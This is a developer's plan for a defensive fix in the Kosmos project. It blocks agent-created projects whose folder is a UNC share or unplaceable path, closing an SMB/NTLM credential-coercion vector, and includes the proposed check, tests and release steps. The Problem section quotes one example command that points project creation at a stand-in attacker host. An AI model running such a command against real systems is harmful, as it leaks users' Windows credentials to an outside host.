# Plan: refuse an agent create on a network-share folder (kosmos#7331 Part 1)

Branch: `share-create-refusal-7331` (worktree off origin/main `b7430e1b07`).
Addresses kosmos#7331 (non-closing). Split from #7229; #7250 closed the sibling attach path.

## Problem (confirmed live on main 2026-11-05)

`POST /api/projects` (server.js:22748) creates a project from `body.folder`. The handler
computes `viaScreen = isViaScreen(req, body)` (22767) but uses it only for maker naming and
the runaway valve, NOT as a folder gate. It then calls `projects.create({ ..., folder:
body.folder, ... })` (22796), which resolves the folder inside the engine
(`folderState` -> `realpathOfFolderPath` -> `resolveReal` -> `fs.realpathSync.native`).

So an agent running `kosmos project create "x" \\attacker-host\share` makes the board resolve
`\\attacker-host\share` at create time. On Windows that is an SMB/NTLM handshake to an
attacker-named host (credential-exposure / coercion vector), triggered BEFORE the project is
even made, with no person in the loop.

#7250 closed exactly this contact on the ATTACH path (engine/replyfile.js `ON_NETWORK`,
spelling-only, zero realpath). This card closes it on the CREATE path.

## Non-goals / already-closed (do NOT rebuild)

- **Folder-change path is already closed.** `PUT /api/project/:id` refuses an agent folder
  move/rename before `projects.moveFolder` (server.js:23069 move, 23039 rename, both gated so
  an agent cannot reach the resolve). #7331's folder-change done-when is already satisfied on
  main; this plan does not touch it.
- **Part 2 (follow-up, separate card/slice):** flag existing rows Kosmos cannot place
  (`\Device\...`/GLOBALROOT targets) at board start. Out of scope here.

## Fix

In the `POST /api/projects` handler, after the `who.refusal` check (22773) and BEFORE
`projects.create` (22796), add a spelling-only refusal for a process caller:

```js
if (!viaScreen) {
  const folderKind = require('./engine/winpath').classify(body.folder).kind;
  if (folderKind === 'share' || folderKind === 'unplaceable') {
    sendJson(res, 403, { error: '...person adds a share project from Kosmos...' });
    return;
  }
}
```

### Why these two kinds (classify(), engine/winpath.js:183, #7261 MERGED)

`classify(p).kind` is pure-string, no disk touch. Kinds: `local-volume`, `local-drive`,
`share`, `no-file-namespace`, `unplaceable`, `local-other`.

- Refuse **`share`** (`\\host\share\...`) -> the direct SMB/NTLM vector.
- Refuse **`unplaceable`** (networkSpelled but not a recognized drive/share/no-file namespace;
  may follow DosDevices aliases -> UNC on resolve). Matches #7250 / `mayHold` erring toward refuse.
- Do NOT refuse `no-file-namespace` (pipe/mailslot/DOS device): holds no files, makes no
  outbound NTLM contact; #7250/`mayHold` already treat it as "holds nothing".
- Do NOT touch `local-volume`/`local-drive`/`local-other`: a local agent create is legitimate
  (#4740). Empty/absent folder classifies as `local-other`, so folderless creates are unaffected.

### Scope note (state honestly, it is not a gap)

A drive-letter mapping to a share (`X: -> \\host\share`) classifies as `local-drive`: a
pure-string reader cannot tell `X:` is a network mapping, and resolving it to find out would
itself be the network contact we refuse. So this catches the UNC/share and unplaceable
SPELLINGS (the actual attack: a UNC folder passed on the CLI), not a drive-letter mapping.
Identical to #7250's spelling-based, no-realpath approach.

### Placement / style

- Reuse the already-computed `viaScreen` local (do not recompute `isViaScreen`).
- Inline `require('./engine/winpath')` mirrors the inline `require('./engine/replyfile')`
  calls already in server.js (winpath is not required at the top).
- `viaScreen === true` (person at the board) path is UNCHANGED: a person's share project works.

## Tests (run on Mac — classify() is pure-string/cross-platform, not win32-gated)

Extend the create tests. Assert:
1. Agent create (`!viaScreen`) with `\\host\share` -> 403, `projects.create` NOT called, zero
   realpath, fast answer (no network).
2. Agent create with an `unplaceable` spelling -> 403 (same).
3. Agent create with a local folder -> still succeeds (does not over-refuse #4740).
4. Person-via-board (`viaScreen`) with the same `\\host\share` -> still succeeds (positive arm).

Candidate files: `server.agent-projects-4491.test.js`, `server.test.js` (create arms),
`cli.project-create-3388.test.js`. Pick by reading the harness shape for how a create request
is driven with/without an agent token.

## Validation / gate (HEAVY — hold until the release box is clear)

0.7.92 release: merge hold lifted ~14:31 CST, but Kitty deploys next and nothing heavy runs on
Mortals until that deploy is through (check `tools/who-has-the-box.sh` first). So:
- Node suite via `unset KOSMOS_AGENT_TOKEN; bash tools/run-tests.sh` (not `env -u`).
- `/challenge-loop` (blind multi-model review to convergence) -> hash-verified proof.
- PR, reviewer `joshualeestone`, body "Addresses #7331" (non-closing). Run
  `bash tools/who-has-the-box.sh` in the same turn as any merge.
